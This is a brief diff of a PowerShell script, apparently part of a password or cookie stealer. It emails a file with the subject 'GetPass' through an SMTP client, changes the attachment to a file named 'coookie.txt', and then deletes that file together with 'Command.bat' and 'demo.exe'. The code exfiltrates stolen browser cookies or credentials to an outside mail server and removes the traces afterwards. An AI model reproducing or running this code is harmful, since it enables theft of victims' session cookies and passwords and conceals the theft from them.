@@ -20,11 +20,11 @@ $ReportEmail.Subject = 'GetPass'
 
 $ReportEmail.Body = 'GetPass_text'  
 
-$ReportEmail.Attachments.Add('D:\a.txt')
+$ReportEmail.Attachments.Add('D:\coookie.txt')
 $SMTPInfo.Timeout = 1000000
 $SMTPInfo.Send($ReportEmail)
 $ReportEmail.Attachments.Dispose()
 
-remove-item 'D:\a.txt'
+remove-item 'D:\coookie.txt'
 remove-item 'D:\Command.bat'
 remove-item 'D:\demo.exe'
